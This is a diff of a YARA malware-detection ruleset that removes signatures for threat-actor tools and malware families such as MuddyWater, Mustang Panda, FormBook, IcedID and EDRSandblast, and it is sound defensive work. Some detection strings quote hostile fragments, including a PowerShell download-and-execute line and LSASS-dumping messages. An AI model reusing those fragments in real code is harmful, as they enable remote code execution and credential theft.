-    description = "Observed ASCII and Wide strings of obfuscated solarmarker dll"
-    reference   = "http://security5magics.blogspot.com/2020/12/tracking-jupyter-malware.html"
-
-  strings:
-    $mz       = "MZ"
-    $wstring1 = "A+Aa+A" wide
-    $astring1 = "hkResult" ascii
-    $astring2 = "mscorlib" ascii
-    $astring3 = "System.Reflection" ascii
-    $astring4 = "CreateDecryptor" ascii
-    $astring5 = "ToBase64String" ascii
-
-  condition:
-    $mz at 0 and $wstring1 and 1 of ($astring*)
 }
 
 rule AgeLocker {
@@ -43172,28 +39751,6 @@ rule apt_cloudatlas_powershower_variant {
     all of them
 }
 
-rule apt_cloudatlas_powertunnel {
-  meta:
-    id             = "04981493-de8b-4662-ae81-8866c182f8b2"
-    version        = "1.0"
-    description    = "Detects PowerTunnel DLL of CloudAtlas"
-    author         = "Sekoia.io"
-    creation_date  = "2022-11-29"
-    classification = "TLP:CLEAR"
-
-  strings:
-    $ = "BeginGetHostEntry"
-    $ = "get_AddressList"
-    $ = "time_stop_delay_seconds"
-    $ = "<connect><result>{0}</result></connect>"
-    $ = "_CorDllMain"
-
-  condition:
-    uint16be(0) == 0x4d5a and
-    filesize < 1MB and
-    all of them
-}
-
 rule apt_cloudatlas_rtf_shellcode_cve_2018_0798 {
   meta:
     id             = "6c602c66-df40-4436-800f-e548dacc1e81"
@@ -43299,27 +39856,6 @@ rule apt_emberbear_credpump_strings {
     uint32be(0) == 0x7f454c46 and
     filesize < 200KB and
     all of them
-}
-
-rule apt_evasive_panda_rphost_dll {
-  meta:
-    id             = "8d70639d-b736-4823-86ad-37f0e383b5f7"
-    version        = "1.0"
-    description    = "Detects DLL used by Evasive Panda"
-    author         = "Sekoia.io"
-    creation_date  = "2024-03-15"
-    classification = "TLP:CLEAR"
-    hash           = "fa44028115912c95b5efb43218f3c7237d5c349f"
-
-  strings:
-    $s1 = "htks.ini" ascii fullword
-    $s2 = "MyDemo" wide fullword
-
-  condition:
-    uint16be(0) == 0x4d5a and
-    all of them
-
-    and filesize < 1MB
 }
 
 rule apt_gamaredon_ddrdoh_vbs_downloader {
@@ -43960,27 +40496,6 @@ rule apt_muddywater_manifestation_backdoor_obfuscated {
     $m at 0 and ($t at (filesize - 16) or $w in (filesize - 200..filesize))
 }
 
-rule apt_muddywater_muddyc2go_dll_launcher_strings {
-  meta:
-    id             = "59756195-d842-4038-8fbf-43d26f4353bc"
-    version        = "1.0"
-    description    = "Detects MuddyC2Go DLL launcher"
-    author         = "Sekoia.io"
-    creation_date  = "2024-03-07"
-    classification = "TLP:CLEAR"
-    hash           = "1a0827082d4b517b643c86ee678eaa53f85f1b33ad409a23c50164c3909fdaca"
-
-  strings:
-    $ = "-Method GET -ErrorAction Stop;Write-Output $response.Content;iex $response.Content;"
-    $ = "GetCurrentProcess"
-    $ = "TerminateProcess"
-
-  condition:
-    uint16be(0) == 0x4d5a and
-    filesize < 50KB and
-    all of them
-}
-
 rule apt_muddywater_powgoop_loader {
   meta:
     id             = "716b45e1-9f17-4546-a003-a7c78340d623"
@@ -44092,27 +40607,6 @@ rule apt_mustangpanda_tinynote {
     (uint32be(0) == 0x7f454c46 or uint16be(0) == 0x4d5a) and
     filesize < 8MB and
     all of them
-}
-
-rule apt_mustangpanda_xoreddll {
-  meta:
-    id             = "73d13624-01df-41ab-b449-86db43dc6c55"
-    version        = "1.0"
-    description    = "Detects xored DLL from MustangPanda embedding a document"
-    author         = "Sekoia.io"
-    creation_date  = "2022-07-19"
-    classification = "TLP:CLEAR"
-
-  strings:
-    $clear = "This program cannot be run in DOS mode"
-    $stub  = "This program cannot be run in DOS mode" xor
-    $res1  = "5w>w9wR'31Z" xor
-    $res2  = "r0y0~0KlBD" xor
-    $res3  = "d&o&h&öé7Æ" xor
-    $res4  = "9{2{5{+0" xor
-
-  condition:
-    $stub and any of ($res*) and not $clear and filesize < 3MB
 }
 
 rule apt_mustangpanda_zpakage {
@@ -45630,36 +42124,6 @@ rule implant_mac_smoothoperator_update_agent {
     uint32be(0) == 0xcffaedfe and 2 of them
 }
 
-rule kimsuky_konni_dll {
-  meta:
-    id             = "6a20c492-e932-41bd-ac4a-01d35bfb0c49"
-    version        = "1.0"
-    description    = "Rule based on structure offset and file extension"
-    author         = "Sekoia.io"
-    creation_date  = "2022-09-12"
-    classification = "TLP:CLEAR"
-
-  strings:
-    $ext_1 = ".zip" wide ascii fullword
-    $ext_2 = ".cab" wide ascii fullword
-    $ext_3 = ".rar" wide ascii fullword
-    $ext_4 = ".ini" wide ascii fullword
-    $ext_5 = ".dat" wide ascii fullword
-
-    $offset_structure_1 = { 8d ?? 08 02 00 00 }  //offset 0x208
-    $offset_structure_2 = { 8d ?? 10 04 00 00 }  //offset 0x410
-    $offset_structure_3 = { 8d ?? 18 06 00 00 }  //offset 0x618
-    $offset_structure_4 = { 8d ?? 20 08 00 00 }  //offset 0x820
-    $offset_structure_5 = { 8d ?? 28 0a 00 00 }  //offset 0xa28
-    $offset_structure_6 = { 89 ?? f8 11 00 00 }  //offset 0x11f8
-    $offset_structure_7 = { 8d ?? fc 11 00 00 }  //offset 0x11fc
-    $offset_structure_8 = { 89 ?? 0c 12 00 00 }  //offset 0x120c
-    $offset_structure_9 = { 89 ?? 10 12 00 00 }  //offset 0x1210
-
-  condition:
-    uint16be(0) == 0x4d5a and filesize < 11MB and all of them
-}
-
 rule koi_koiloader {
   meta:
     id             = "b8289d78-42de-4919-b2c5-3c926ddd8043"
@@ -46200,26 +42664,6 @@ rule tool_dogtunnel_strings {
     and all of them and filesize < 10MB
 }
 
-rule tool_dynamicwrapper_strings {
-  meta:
-    id             = "bbfad0a8-8b86-47c7-bf70-0a3f6859d64b"
-    version        = "1.0"
-    description    = "Detects DynamicWrapperX"
-    author         = "Sekoia.io"
-    creation_date  = "2023-12-01"
-    classification = "TLP:CLEAR"
-
-  strings:
-    $ = "Software\\Classes\\DynamicWrapperX" ascii
-    $ = "DllRegisterServer" ascii
-    $ = "GoLink, GoAsm" ascii
-
-  condition:
-    uint16be(0) == 0x4d5a and
-    filesize < 100KB and
-    all of them
-}
-
 rule tool_edrsandblast_api_strings {
   meta:
     id             = "8a5dc171-dce8-4b5a-96e9-53dd1855e8c1"
@@ -46239,26 +42683,6 @@ rule tool_edrsandblast_api_strings {
   condition:
     uint16be(0) == 0x4d5a and
     filesize < 1MB and
-    4 of them
-}
-
-rule tool_edrsandblast_cli_strings {
-  meta:
-    id             = "baf3c68a-1d28-464e-8240-28cc66c8c151"
-    version        = "1.0"
-    description    = "Detects EDRSandblast CLI strings"
-    author         = "Sekoia.io"
-    creation_date  = "2024-01-08"
-    classification = "TLP:CLEAR"
-
-  strings:
-    $ = "[!] LSASS dump might fail if RunAsPPL" wide
-    $ = "[!] You did not provide at least one option between" wide
-    $ = "[+] Detecting userland hooks in all loaded DLLs" wide
-    $ = "[+] Saving them to the CSV file" wide
-
-  condition:
-    uint16be(0) == 0x4d5a and
     4 of them
 }
 
@@ -46970,53 +43394,6 @@ rule webshell_icesword_strings {
     2 of them and filesize < 100KB
 }
 
-rule marcher1 {
-  meta:
-    author      = "Antonio S. <asanchez@koodous.com>"
-    source      = "https://analyst.koodous.com/rulesets/890"
-    description = "This rule detects is to detect a type of banking malware"
-    sample      = "33b1a9e4a1591c1a39fdd5295874e365dbde9448098254a938525385498da070"
-
-  strings:
-    $a = "cmVudCYmJg=="
-    $b = "dXNzZCYmJg=="
-
-  condition:
-    all of them
-
-}
-
-rule marcher2 {
-  meta:
-    author = "Antonio S. <asanchez@koodous.com>"
-    source = "https://analyst.koodous.com/rulesets/890"
-
-  strings:
-    $a = "HDNRQ2gOlm"
-    $b = "lElvyohc9Y1X+nzVUEjW8W3SbUA"
-
-  condition:
-    all of them
-
-}
-
-rule marcher_v2 {
-  meta:
-    description = "This rule detects a new variant of Marcher"
-    sample      = "27c3b0aaa2be02b4ee2bfb5b26b2b90dbefa020b9accc360232e0288ac34767f"
-    author      = "Antonio S. <asanchez@koodous.com>"
-    source      = "https://analyst.koodous.com/rulesets/1301"
-
-  strings:
-    $a = /assets\/[a-z]{1,12}.datPK/
-    $b = "mastercard_img"
-    $c = "visa_verifed"
-
-  condition:
-    all of them
-
-}
-
 rule MSIETabularActivex {
   meta:
     ref    = "CVE-2010-0805"
@@ -47270,22 +43647,6 @@ rule free_pascal {
 
   condition:
     any of them
-}
-
-rule EXT_HKTL_MAL_TinyShell_Backdoor_SPARC {
-  meta:
-    author      = "Mandiant"
-    description = "Detects Tiny Shell variant for SPARC - an open-source UNIX backdoor"
-    date        = "2022-03-17"
-    reference   = "https://www.mandiant.com/resources/blog/unc2891-overview"
-    score       = 80
-
-  strings:
-    $sb_xor_1 = { DA 0A 80 0C 82 18 40 0D C2 2A 00 0B 96 02 E0 01 98 03 20 01 82 1B 20 04 80 A0 00 01 82 60 20 00 98 0B 00 01 C2 4A 00 0B 80 A0 60 00 32 BF FF F5 C2 0A 00 0B 81 C3 E0 08 }
-    $sb_xor_2 = { C6 4A 00 00 80 A0 E0 00 02 40 00 0B C8 0A 00 00 85 38 60 00 C4 09 40 02 84 18 80 04 C4 2A 00 00 82 00 60 01 80 A0 60 04 83 64 60 00 10 6F FF F5 90 02 20 01 81 C3 E0 08 }
-
-  condition:
-    uint32(0) == 0x464C457F and (uint16(0x10) & 0x0200 == 0x0200) and (uint16(0x12) & 0x0200 == 0x0200) and 1 of them
 }
 
 rule EXT_APT_UNC2891_SLAPSTICK {
@@ -47817,19 +44178,6 @@ rule AntiDebugging_Interrupt {
     (uint8(8) == 0xCC or uint8(8) == 0xF1 or uint8(8) == 0xCC)
 }
 
-rule IcedIDHook {
-  meta:
-    author       = "kevoreilly"
-    description  = "IcedID hook fix"
-    cape_options = "ntdll-protect=0"
-
-  strings:
-    $hook = { C6 06 E9 83 E8 05 89 46 01 8D 45 ?? 50 FF 75 ?? 6A 05 56 6A FF E8 2D FA FF FF }
-
-  condition:
-    any of them
-}
-
 rule MysterySnail {
   meta:
     author       = "kevoreilly"
@@ -47960,22 +44308,6 @@ rule blackremote_blackrat_payload_2020 {
 
   condition:
     2 of them and (1 of ($re*) or $hex_rsrc)
-}
-
-rule formbook_vb {
-  meta:
-    author = "jeFF0Falltrades"
-    ref    = "https://thisissecurity.stormshield.com/2018/03/29/in-depth-formbook-malware-analysis-obfuscation-and-process-injection/"
-
-  strings:
-    $hex_set_info    = { 68 65 73 73 00 68 50 72 6F 63 68 74 69 6F 6E 68 6F 72 6D 61 68 74 49 6E 66 68 4E 74 53 65 54 EB 2C }
-    $hex_decode_loop = { 81 34 24 [4] 83 E9 03 E0 F1 FF 34 0E 81 34 24 }
-    $hex_anti_check  = { 80 78 2A 00 74 3D 80 78 2B 00 74 37 80 78 2C 00 75 31 80 78 2D 00 75 2B 80 78 2E 00 74 25 80 78 2F 00 75 1F 80 78 30 00 74 19 80 78 31 00 75 13 80 78 32 00 74 0D 80 78 33 00 }
-    $hex_precheck    = { E8 AE FA FF FF 3D 00 03 00 00 0F 9F C2 56 88 56 35 E8 3D FC FF FF 56 E8 E7 F6 FF FF 56 E8 41 F9 FF FF 56 E8 AB F7 FF FF 56 E8 F5 DE FF FF }
-    $str_marker      = "r5.oZe/gg" wide ascii
-
-  condition:
-    2 of them
 }
 
 rule frat_loader {
@@ -48641,25 +44973,6 @@ rule IOC_NA_7z {
     hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
 }
 
-rule IOC_FORMBOOK___ace_ {
-  meta:
-    author     = "Laboratoire Epidemiology & Signal Intelligence"
-    ref_IOC    = "IOC_FORMBOOK_LAB"
-    date_IOC   = "2023-11-15 07:38:59"
-    info       = "Version 1.0 b"
-    internal   = false
-    score      = 99
-    risk_score = 10
-    threat     = "FORMBOOK"
-    file_type  = "__ace_"
-    comment    = "Source : abuse.ch"
-
-  condition:
-    hash.sha256(0, filesize) == "4b0088a5ea5b554b183064229db63803bac5538cd7cb9f5f1092e50dce0d4ade" or
-    hash.sha256(0, filesize) == "7d3b00a4fcda70ad6620192068b141cc01d43f1d4ed650ddd65593cb24f7f9c1" or
-    hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
-}
-
 rule IOC_COINMINER_msi {
   meta:
     author     = "Laboratoire Epidemiology & Signal Intelligence"
@@ -48695,44 +45008,6 @@ rule IOC_AGENTTESLA_z {
   condition:
     hash.sha256(0, filesize) == "f225748d809c050133e79a599b01e18472d8bd66591e679c54e66c2b33c43509" or
     hash.sha256(0, filesize) == "7a8f27f3ad544c3c482f04e8fcb92fdeb4d19250228b3522ad4490aad2ae4b8d" or
-    hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
-}
-
-rule IOC_REMCOSRAT_zip {
-  meta:
-    author     = "Laboratoire Epidemiology & Signal Intelligence"
-    ref_IOC    = "IOC_REMCOSRAT_LAB"
-    date_IOC   = "2023-11-14 11:57:52"
-    info       = "Version 1.0 b"
-    internal   = false
-    score      = 99
-    risk_score = 10
-    threat     = "REMCOSRAT"
-    file_type  = "zip"
-    comment    = "Source : abuse.ch"
-
-  condition:
-    hash.sha256(0, filesize) == "12b615a29aa38f8084b6e23828007897953c887037a8ebea8828c62cfb396831" or
-    hash.sha256(0, filesize) == "392624a0ee0d3c34ae9ad9607e9f8683156447379beac0ec8519c70dedbb74d0" or
-    hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
-}
-
-rule IOC_FORMBOOK_zip {
-  meta:
-    author     = "Laboratoire Epidemiology & Signal Intelligence"
-    ref_IOC    = "IOC_FORMBOOK_LAB"
-    date_IOC   = "2023-11-14 09:03:02"
-    info       = "Version 1.0 b"
-    internal   = false
-    score      = 99
-    risk_score = 10
-    threat     = "FORMBOOK"
-    file_type  = "zip"
-    comment    = "Source : abuse.ch"
-
-  condition:
-    hash.sha256(0, filesize) == "7be9d6679205f724ef08f8aeb900ff19e0ccc47bda06a458cf84138406056de4" or
-    hash.sha256(0, filesize) == "54991e3f6afe4b0c7f2d6d43dada59b2614ce28f0af811eadf2bf7a213b13b58" or
     hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
 }
 
@@ -48806,52 +45081,6 @@ rule IOC_NA_msi {
     hash.sha256(0, filesize) == "ab6b3a30d643bd1a807d4415e554a7e005c9320d1adbd0bfb4666cf1509c3078" or
     hash.sha256(0, filesize) == "69925c370a71b0bc37eb5d6381e8fc3309a7e71a7bdade54233214c73c728170" or
     hash.sha256(0, filesize) == "24e7e2dcb6102224d489081a32b1aee6c1ea035295d58fbce7f85c7f22c543fe" or
-    hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
-}
-
-rule IOC_NA_dll {
-  meta:
-    author     = "Laboratoire Epidemiology & Signal Intelligence"
-    ref_IOC    = "IOC_NA_LAB"
-    date_IOC   = "2023-11-14 04:42:31"
-    info       = "Version 1.0 b"
-    internal   = false
-    score      = 99
-    risk_score = 10
-    threat     = "NA"
-    file_type  = "dll"
-    comment    = "Source : abuse.ch"
-
-  condition:
-    hash.sha256(0, filesize) == "3afd0ec9ff87802fecb70c64bf0c0b86081bd909b9b649f902931964d585632a" or
-    hash.sha256(0, filesize) == "d6f843c7ea0e1bbef9b381b35d2e942b88f204c1a43de76011da57563f21c95e" or
-    hash.sha256(0, filesize) == "379e01a20f66afe32b7792eab0bc3d97179ee0fcca919e4604769d6a6fc3c2e1" or
-    hash.sha256(0, filesize) == "506bc39774eea82a02c20bce1ef02b751133eee9e512747c250d972124fef76b" or
-    hash.sha256(0, filesize) == "ea44b39b32fd766f5a4c9b0d426451065e3ed6d9d977cddcb7cfacfcd82be47d" or
-    hash.sha256(0, filesize) == "5cc6b31669023b1f74191cc76d25924fb652a19c92eb3bef80d176304b0cee1a" or
-    hash.sha256(0, filesize) == "035243c99d29f9f785e7f76ac3e744c56c7386449ad51b1d7cce9c19380a487c" or
-    hash.sha256(0, filesize) == "ba3b6093e676d0d4ed3832efc496ad3a1b7c24e9a27574520c7b54e84b93de32" or
-    hash.sha256(0, filesize) == "cd12655ebbcfc6789326d27f125ee39ec47b49c93ffd3e80af11d308a917107d" or
-    hash.sha256(0, filesize) == "1f0dd88879a0facb7ad1cec668a9c65bcf06ac1d69945989770f04740e1117a7" or
-    hash.sha256(0, filesize) == "fd45836d17756388b7bf67083e5247fdbe2154149f4a9cf3d30fc8348e3020ac" or
-    hash.sha256(0, filesize) == "e4f32b898bb95e747f9b11d1b7dd52a8a36e7116e66fa171eebed1bb290eabe5" or
-    hash.sha256(0, filesize) == "af32907430cff27948a020b20e76c590d6561e1a9f7464d7071fc4d5c4db7b1d" or
-    hash.sha256(0, filesize) == "080c2b0ebcaa675f7cc3087a62b458bd05829a5056b93b478b0c137140e613ed" or
-    hash.sha256(0, filesize) == "c367c645711aeebb01f2332638dbad2b665bb9cc7e34fcc6c2eae91385da730d" or
-    hash.sha256(0, filesize) == "98cd89574c41cd0f664b482c7964386b96987b8dac316860f4f02b351da8a77e" or
-    hash.sha256(0, filesize) == "fd84fbbb02015979484e56ee1f8de94df66b7c031c8df094c25ee8d4189e2f62" or
-    hash.sha256(0, filesize) == "5dce23221c5c4ce62fb33f2de5438ae15b86d796c39091cfb495ca01f8eb04c2" or
-    hash.sha256(0, filesize) == "2eef4b05700162c4b8b9f00d8ef7b0d11e1e273219d30130561293bb429f1850" or
-    hash.sha256(0, filesize) == "f4b90e1ceaa1c88458604f34205b55f5cc7bbd11dc9da6e5fb0b2dd20215774a" or
-    hash.sha256(0, filesize) == "8383d1cf45e6dd5345dc5d6e7aff4dff75a5dac629a617cc08150924ab019fee" or
-    hash.sha256(0, filesize) == "7b9c99c1aeb0681b96a38c5084658497d4ebd6a196f8618030cb034295d825b3" or
-    hash.sha256(0, filesize) == "1f9a4fa0a9cb98637bf34cf919c0f964551b79abcce5621d7b165720aa45988c" or
-    hash.sha256(0, filesize) == "f122b4ab576902c76b6f127399d6fa51c94fcc90a87c4f870acb6aa2c74fc2be" or
-    hash.sha256(0, filesize) == "7dfc837c2da8c5a32150052a9876447170d8923b31409a3a1919d918027cae19" or
-    hash.sha256(0, filesize) == "591d2575c173f07028f37e371da17f7727c78d31ab1578b222c976fa5fad2b3c" or
-    hash.sha256(0, filesize) == "bc60d6b0dd2558c683f2db24c79187f1c870e35deb4dd5586965f49e2d24de33" or
-    hash.sha256(0, filesize) == "f366d535c63702f7412cfe4ec1c63edc3dd86c44f2d42ce9e6cfd63cec78d930" or
-    hash.sha256(0, filesize) == "b9a953af462e7c92a64aa70d6e596cd715b3e0cf5761bd76a80d8c252c45a38c" or
     hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
 }
 
@@ -50262,76 +46491,6 @@ rule gozi_17386_canWell_js {
     all of ($s*)
 }
 
-rule case_18543_eightc11812d_65fd_48ee_b650_296122a21067_zip {
-  meta:
-    description = "18543 - file 8c11812d-65fd-48ee-b650-296122a21067.zip"
-    author      = "The DFIR Report via yarGen Rule Generator"
-    reference   = "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/"
-    date        = "2023-08-28"
-    hash1       = "be604dc018712b1b1a0802f4ec5a35b29aab839f86343fc4b6f2cb784d58f901"
-
-  strings:
-    $s1  = "OkskyF6" fullword ascii
-    $s2  = "^Z* n~!" fullword ascii
-    $s3  = "eanT0<-" fullword ascii
-    $s4  = "_TULbx4j%`A" fullword ascii
-    $s5  = "knDK^bE" fullword ascii
-    $s6  = "yGsP!C" fullword ascii
-    $s7  = ")tFFmt[d" fullword ascii
-    $s8  = "uepeV1a-Ud" fullword ascii
-    $s9  = "V`jtvX!" fullword ascii
-    $s10 = "WYzqO=h" fullword ascii
-    $s11 = "RRZDrM," fullword ascii
-    $s12 = "msPBA|N" fullword ascii
-    $s13 = "document-35068.isoUT" fullword ascii
-    $s14 = "XuUgLiM" fullword ascii
-    $s15 = "GFyM<]a" fullword ascii
-    $s16 = "QjgMjS\\" fullword ascii
-    $s17 = "fHqb3FJq= " fullword ascii
-    $s18 = "Ndsfif" fullword ascii
-    $s19 = "\\n9F8m" fullword ascii
-    $s20 = "wZxzh5" fullword ascii
-
-  condition:
-    uint16(0) == 0x4b50 and filesize < 700KB and
-    8 of them
-}
-
-rule case_18543_pimpliest_kufic_png {
-  meta:
-    description = "18543 - file pimpliest_kufic.png"
-    author      = "The DFIR Report via yarGen Rule Generator"
-    reference   = "https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/"
-    date        = "2023-08-28"
-    hash1       = "c6294ebb7d2540ee7064c60d361afb54f637370287983c7e5e1e46115613169a"
-
-  strings:
-    $s1  = "rrr---" fullword ascii  /* reversed goodware string '---rrr' */
-    $s2  = "RJjlJn93" fullword ascii
-    $s3  = "CBnhJy+" fullword ascii
-    $s4  = "nFSUFd#sn" fullword ascii
-    $s5  = "ZIHV (N8" fullword ascii
-    $s6  = "zzznnn+++fffggg" fullword ascii
-    $s7  = "WWWYYY111SSS///" fullword ascii
-    $s8  = "pBpl-{@hy#D" fullword ascii
-    $s9  = "kv.NuQ<\\" fullword ascii
-    $s10 = "wDWl{h5" fullword ascii
-    $s11 = "3QWsTTog" fullword ascii
-    $s12 = "djdr hX" fullword ascii
-    $s13 = "MMMJJJ000GGGFFFRRR" fullword ascii
-    $s14 = "AsYI^a/K" fullword ascii
-    $s15 = "hWtw&cpk" fullword ascii
-    $s16 = "QwoAMdi" fullword ascii
-    $s17 = "CsIIzhS" fullword ascii
-    $s18 = "yXqbrLb" fullword ascii
-    $s19 = ")RQMWtuNZ}}" fullword ascii
-    $s20 = "mupvqqxLj" fullword ascii
-
-  condition:
-    uint16(0) == 0x5089 and filesize < 400KB and
-    8 of them
-}
-
 rule case_19438_files_MalFiles_NSM {
   meta:
     description = "19438 - file NSM.LIC"
@@ -50454,29 +46613,6 @@ rule mal_truebot: TESTING MALWARE TA0002 T1027 T1204_002 {
 
   condition:
     13 of them
-}
-
-rule case_23869_sysfunc_dll {
-  meta:
-    creation_date = "2024-03-29"
-    status        = "TESTING"
-    sharing       = "TLP:WHITE"
-    source        = "THEDFIRREPORT.COM"
-    author        = "TDR"
-    description   = "Description"
-    category      = "TOOL"
-    reference     = "https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/"
-    hash          = "b3942ead0bf76cf5f4baaa563b603fb6343009c324e3c862d16bbbbdcf482f1a"
-
-  strings:
-    $s1 = "gentlemen" fullword
-    $s2 = "withdraw fang" fullword
-    $s3 = "plants; mould, sympathize, elephant; associate" fullword
-    $s4 = "blessing, defender; fashionable" fullword
-    $s5 = "withdraw fang" fullword
-
-  condition:
-    all of them
 }
 
 rule icedid_license_3930 {
@@ -50669,41 +46805,6 @@ rule tuawktso_7685 {
 
   condition:
     uint16(0) == 0xe0ee and filesize < 12000KB and
-    8 of them
-}
-
-rule wmyvpa_7685 {
-  meta:
-    description = "Files - file wmyvpa.sae"
-    author      = "The DFIR Report"
-    reference   = "https://thedfirreport.com"
-    date        = "2022-02-01"
-    hash1       = "3d913a4ba5c4f7810ec6b418d7a07b6207b60e740dde8aed3e2df9ddf1caab27"
-
-  strings:
-    $s1  = "spfX.hRN<" fullword ascii
-    $s2  = "wJriR>EOODA[.tIM" fullword ascii
-    $s3  = "5v:\\VAL" fullword ascii
-    $s4  = "K6U:\"&" fullword ascii
-    $s5  = "%v,.IlZ\\" fullword ascii
-    $s6  = "\\/kX>%n -" fullword ascii
-    $s7  = "!Dllqj" fullword ascii
-    $s8  = "&ZvM* " fullword ascii
-    $s9  = "AU8]+ " fullword ascii
-    $s10 = "- vt>h" fullword ascii
-    $s11 = "+ u4hRI" fullword ascii
-    $s12 = "ToX- P" fullword ascii
-    $s13 = "S!G+ u" fullword ascii
-    $s14 = "y 9-* " fullword ascii
-    $s15 = "nl}* J" fullword ascii
-    $s16 = "t /Y Fo" fullword ascii
-    $s17 = "O^w- F" fullword ascii
-    $s18 = "N -Vw'" fullword ascii
-    $s19 = "hVHjzI4" fullword ascii
-    $s20 = "ujrejn8" fullword ascii
-
-  condition:
-    uint16(0) == 0xd3c2 and filesize < 12000KB and
     8 of them
 }
 
@@ -52492,86 +48593,6 @@ rule MAL_MATA_Beacon_Command_Opcodes {
 
   condition:
     (uint32be(0x0) == 0xCAFEBABE or uint32be(0x0) == 0xCFFAEDFE or uint32be(0x0) == 0xCEFAEDFE) and
-    all of them
-}
-
-rule ntdll_flipflop {
-  strings:
-    $ntdll_flipflop = "tnldl" nocase ascii wide
-
-  condition:
-    all of them
-}
-
-rule ntdll_reverse {
-  strings:
-    $ntdll_reverse = "lldtn" nocase ascii wide
-
-  condition:
-    all of them
-}
-
-rule ntdll_hex_enc_str {
-  strings:
-    $ntdll_hex_enc_str = "6e74646c6c" nocase ascii wide
-
-  condition:
-    all of them
-}
-
-rule ntdll_decimal {
-  strings:
-    $ntdll_decimal = "110 116 100 108 108" nocase ascii wide
-
-  condition:
-    all of them
-}
-
-rule ntdll_fallchill {
-  strings:
-    $ntdll_fallchill = "mgwoo" nocase ascii wide
-
-  condition:
-    all of them
-}
-
-rule ntdll_stackpush {
-  strings:
-    $ntdll_stackpush = "hlhntdl" nocase ascii wide
-
-  condition:
-    all of them
-}
-
-rule ntdll_stackpushnull {
-  strings:
-    $ntdll_stackpushnull = "hl\x00hntdl" nocase ascii wide
-
-  condition:
-    all of them
-}
-
-rule ntdll_stackpushdoublenull {
-  strings:
-    $ntdll_stackpushdoublenull = "hl\x00\x00hntdl" nocase ascii wide
-
-  condition:
-    all of them
-}
-
-rule ntdll_hex_movebp {
-  strings:
-    $ntdll_hex_movebp = { c6 45 ?? 6e c6 45 ?? 74 c6 45 ?? 64 c6 45 ?? 6c c6 45 ?? 6c }
-
-  condition:
-    all of them
-}
-
-rule ntdll_rot13 {
-  strings:
-    $ntdll_rot13 = "agqyy" nocase ascii wide
-
-  condition:
     all of them
 }
 
@@ -59307,17 +55328,6 @@ rule DES_permuted_choice_key__table___8_byt_48_ {
     $a0
 }
 
-rule _DevCpp_v5_ {
-  meta:
-    description = "Dev-C++ v5"
-
-  strings:
-    $0 = { 55 89 E5 83 EC 14 6A ?? FF 15 ?? ?? ?? 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 }
-
-  condition:
-    $0
-}
-
 rule _codeCrypter_031_ {
   meta:
     description = "codeCrypter 0.31"
@@ -59349,19 +55359,6 @@ rule _AsCrypt_V01__SToRM_ {
 
   condition:
     $0
-}
-
-rule InstallShield_Cabinet_Archive: InstallShield {
-  meta:
-    author      = "_pusher_"
-    date        = "2016-09"
-    description = "www.flexerasoftware.com"
-
-  strings:
-    $a0 = { 49 53 63 28 ?? ?? 00 ?? 00 ?? 00 00 00 02 00 00 ?? ?? 00 00 ?? ?? ?? 00 00 00 00 00 ?? 00 00 00 ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 }
-
-  condition:
-    $a0
 }
 
 rule NsPackv23: NorthStar {
